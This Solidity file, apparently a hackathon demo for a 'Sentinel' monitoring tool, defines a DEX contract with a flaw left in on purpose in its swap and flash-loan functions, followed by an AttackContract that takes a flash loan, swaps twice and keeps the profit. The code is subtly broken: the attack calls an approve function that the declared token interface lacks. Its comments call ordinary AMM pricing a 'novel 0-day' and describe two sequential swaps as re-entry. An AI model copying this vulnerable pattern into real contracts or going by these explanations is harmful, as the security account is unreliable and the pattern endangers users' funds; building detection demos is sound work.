// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title NovelFlashLoanVulnerableDEX
 * @notice A DEX with a novel 0-day vulnerability
 * @dev This contract has a subtle bug that AI will miss:
 *      - It updates reserves AFTER external transfer (wrong order)
 *      - Not a standard reentrancy pattern
 *      - AI training data likely doesn't include this specific variant
 * 
 * @hackathon This demonstrates Sentinel's runtime heuristic detection
 * @track Chainlink Convergence Hackathon 2026
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract NovelFlashLoanVulnerableDEX {
    
    // ============ Structs ============
    
    struct Pool {
        address token0;
        address token1;
        uint256 reserve0;
        uint256 reserve1;
        uint256 totalLiquidity;
        bool exists;
    }
    
    struct Position {
        uint256 liquidity;
        uint256 owed0;
        uint256 owed1;
    }
    
    // ============ State Variables ============
    
    mapping(bytes32 => Pool) public pools;
    mapping(bytes32 => mapping(address => Position)) public positions;
    mapping(address => uint256) public balances;
    
    bytes32[] public poolList;
    
    address public guardian; // Sentinel guardian
    bool public paused;
    
    uint256 public constant FLASH_LOAN_FEE = 9; // 0.09% fee
    uint256 public constant FEE_DENOMINATOR = 10000;
    
    // ============ Events ============
    
    event PoolCreated(bytes32 indexed poolId, address token0, address token1);
    event LiquidityAdded(bytes32 indexed poolId, address indexed user, uint256 amount0, uint256 amount1);
    event LiquidityRemoved(bytes32 indexed poolId, address indexed user, uint256 amount0, uint256 amount1);
    event Swap(bytes32 indexed poolId, address indexed user, uint256 amountIn, uint256 amountOut, bool zeroForOne);
    event FlashLoan(address indexed asset, uint256 amount, uint256 fee);
    
    // ============ Modifiers ============
    
    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }
    
    modifier onlyGuardian() {
        require(msg.sender == guardian, "Only guardian");
        _;
    }
    
    // ============ Constructor ============
    
    constructor(address _guardian) {
        guardian = _guardian;
    }
    
    // ============ Pool Management ============
    
    function createPool(address token0, address token1) external returns (bytes32 poolId) {
        require(token0 != token1, "Same token");
        require(token0 < token1, "Token order");
        
        poolId = keccak256(abi.encodePacked(token0, token1));
        require(!pools[poolId].exists, "Pool exists");
        
        pools[poolId] = Pool({
            token0: token0,
            token1: token1,
            reserve0: 0,
            reserve1: 0,
            totalLiquidity: 0,
            exists: true
        });
        
        poolList.push(poolId);
        emit PoolCreated(poolId, token0, token1);
    }
    
    // ============ Liquidity ============
    
    function addLiquidity(
        bytes32 poolId,
        uint256 amount0,
        uint256 amount1
    ) external whenNotPaused returns (uint256 liquidity) {
        Pool storage pool = pools[poolId];
        require(pool.exists, "Pool not found");
        
        // Transfer tokens
        IERC20(pool.token0).transferFrom(msg.sender, address(this), amount0);
        IERC20(pool.token1).transferFrom(msg.sender, address(this), amount1);
        
        // Calculate liquidity
        if (pool.totalLiquidity == 0) {
            liquidity = sqrt(amount0 * amount1);
        } else {
            liquidity = min(
                (amount0 * pool.totalLiquidity) / pool.reserve0,
                (amount1 * pool.totalLiquidity) / pool.reserve1
            );
        }
        
        require(liquidity > 0, "No liquidity");
        
        // Update reserves
        pool.reserve0 += amount0;
        pool.reserve1 += amount1;
        pool.totalLiquidity += liquidity;
        
        // Update position
        positions[poolId][msg.sender].liquidity += liquidity;
        
        emit LiquidityAdded(poolId, msg.sender, amount0, amount1);
    }
    
    // ============ SWAP (VULNERABLE) ============
    
    /**
     * @notice Swap tokens
     * @dev VULNERABILITY: Calculates output before updating reserves
     *      This allows price manipulation within the same transaction
     *      The external call happens with STALE reserves
     */
    function swap(
        bytes32 poolId,
        bool zeroForOne,
        uint256 amountIn,
        uint256 minAmountOut
    ) external whenNotPaused returns (uint256 amountOut) {
        Pool storage pool = pools[poolId];
        require(pool.exists, "Pool not found");
        require(amountIn > 0, "Zero amount");
        
        // Determine input/output tokens
        address tokenIn = zeroForOne ? pool.token0 : pool.token1;
        address tokenOut = zeroForOne ? pool.token1 : pool.token0;
        uint256 reserveIn = zeroForOne ? pool.reserve0 : pool.reserve1;
        uint256 reserveOut = zeroForOne ? pool.reserve1 : pool.reserve0;
        
        // BUG: Calculate output BEFORE updating reserves (uses stale price)
        // This is the 0-day: calculations should happen AFTER state updates
        amountOut = getAmountOut(amountIn, reserveIn, reserveOut);
        require(amountOut >= minAmountOut, "Slippage exceeded");
        
        // External call BEFORE state update (vulnerable pattern)
        // Attacker can re-enter here with manipulated state
        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        
        // Transfer output
        IERC20(tokenOut).transfer(msg.sender, amountOut);
        
        // State update AFTER external calls (wrong order!)
        // Reserves are now inconsistent with actual balances
        if (zeroForOne) {
            pool.reserve0 += amountIn;
            pool.reserve1 -= amountOut;
        } else {
            pool.reserve1 += amountIn;
            pool.reserve0 -= amountOut;
        }
        
        emit Swap(poolId, msg.sender, amountIn, amountOut, zeroForOne);
    }
    
    // ============ FLASH LOAN (VULNERABLE) ============
    
    /**
     * @notice Flash loan - allows borrowing without collateral
     * @dev VULNERABILITY: Fee calculation uses stale reserves
     */
    function flashLoan(
        address asset,
        uint256 amount,
        bytes calldata params
    ) external whenNotPaused {
        require(amount > 0, "Zero amount");
        
        uint256 fee = (amount * FLASH_LOAN_FEE) / FEE_DENOMINATOR;
        uint256 balanceBefore = IERC20(asset).balanceOf(address(this));
        
        // Transfer flash loan amount
        IERC20(asset).transfer(msg.sender, amount);
        
        // Execute callback
        require(
            IFlashLoanReceiver(msg.sender).executeOperation(
                _asArray(asset),
                _asArray(amount),
                _asArray(fee),
                msg.sender,
                params
            ),
            "Flash loan failed"
        );
        
        // Repayment check
        uint256 balanceAfter = IERC20(asset).balanceOf(address(this));
        require(balanceAfter >= balanceBefore + fee, "Flash loan not repaid");
        
        emit FlashLoan(asset, amount, fee);
    }
    
    // ============ View Functions ============
    
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) public pure returns (uint256) {
        require(reserveIn > 0 && reserveOut > 0, "No liquidity");
        
        uint256 amountInWithFee = amountIn * 997; // 0.3% fee
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        
        return numerator / denominator;
    }
    
    function getPool(bytes32 poolId) external view returns (Pool memory) {
        return pools[poolId];
    }
    
    function getPoolCount() external view returns (uint256) {
        return poolList.length;
    }
    
    function getPoolAt(uint256 index) external view returns (bytes32) {
        return poolList[index];
    }
    
    // ============ Sentinel Integration ============
    
    function pause() external onlyGuardian {
        paused = true;
    }
    
    function unpause() external onlyGuardian {
        paused = false;
    }
    
    function setGuardian(address _guardian) external onlyGuardian {
        guardian = _guardian;
    }
    
    // ============ Helper Functions ============
    
    function sqrt(uint256 x) internal pure returns (uint256) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        uint256 y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
        return y;
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
    
    function _asArray(address a) internal pure returns (address[] memory) {
        address[] memory arr = new address[](1);
        arr[0] = a;
        return arr;
    }
    
    function _asArray(uint256 a) internal pure returns (uint256[] memory) {
        uint256[] memory arr = new uint256[](1);
        arr[0] = a;
        return arr;
    }
}

/**
 * @title AttackContract
 * @notice Demonstrates the 0-day exploit
 */
contract AttackContract is IFlashLoanReceiver {
    
    NovelFlashLoanVulnerableDEX public dex;
    IERC20 public token;
    bytes32 public targetPool;
    
    constructor(address _dex, address _token, bytes32 _pool) {
        dex = NovelFlashLoanVulnerableDEX(_dex);
        token = IERC20(_token);
        targetPool = _pool;
    }
    
    function executeAttack(uint256 flashAmount) external {
        // Get flash loan
        dex.flashLoan(address(token), flashAmount, abi.encode("attack"));
    }
    
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        // 1. Use flash loan to manipulate price
        token.approve(address(dex), amounts[0]);
        
        // 2. Exploit the vulnerability: swap with stale reserves
        dex.swap(targetPool, true, amounts[0] / 2, 0);
        
        // 3. Re-enter to exploit again
        dex.swap(targetPool, false, amounts[0] / 4, 0);
        
        // 4. Transfer enough back to repay flash loan
        uint256 repayAmount = amounts[0] + premiums[0];
        token.transfer(msg.sender, repayAmount);
        
        // Attacker keeps the profit!
        return true;
    }
}
